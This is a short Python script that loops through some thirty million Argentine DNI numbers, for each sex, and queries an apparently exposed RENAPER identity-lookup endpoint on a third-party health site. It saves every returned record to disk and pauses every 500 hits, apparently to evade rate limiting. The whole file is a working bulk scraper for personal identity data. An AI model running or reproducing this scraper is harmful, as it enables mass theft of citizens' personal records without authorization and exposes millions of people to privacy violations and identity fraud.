import os
import requests
import time
from colorama import Fore

os.system('cls')

def titocalderon(numero, sexo, carpeta):
    url = f"https://hbi.acuariosalud.com/federador.asp?accion=renaper&nrodoc={numero}&sexo={sexo}"
    response = requests.get(url)

    if response.ok and response.text.strip():
        nombre_archivo = os.path.join(carpeta, f"{numero}_{sexo}.txt")
        with open(nombre_archivo, "w", encoding="utf-8") as archivo:
            archivo.write(response.text)
        print(f"Operación {Fore.GREEN}exitosa{Fore.WHITE}: DNI {numero}, Sexo {sexo}. Guardado en el archivo: {Fore.CYAN}{nombre_archivo}{Fore.WHITE}")
        return True
    else:
        print(f"Operación {Fore.RED}fallida{Fore.WHITE}: DNI {numero}, Sexo {sexo}.")
        return False

def el_italiano(inicio, fin):
    for _ in range(inicio, fin):
        numero = str(_).zfill(8)
        primer_digito = numero[0]
        yield numero, primer_digito

def main():
    carpeta_resultados = "ella_me_llama"
    os.makedirs(carpeta_resultados, exist_ok=True)

    sexos = ['M', 'F']
    inicio = 30000000
    fin = 59999999
    lote_size = 500
    lote_actual = 0

    for numero, primer_digito in el_italiano(inicio, fin):
        for sexo in sexos:
            if lote_actual == lote_size:
                lote_actual = 0
                print(f"{Fore.MAGENTA}\n\n\n\nHaciendo una pausa de 2 minutos...\n\n\n\n")
                time.sleep(120)

            if titocalderon(numero, sexo, carpeta_resultados):
                lote_actual += 1
                break
        else:
            print(f"No existe Tito Calderon para DNI {numero}")

if __name__ == "__main__":
    main()
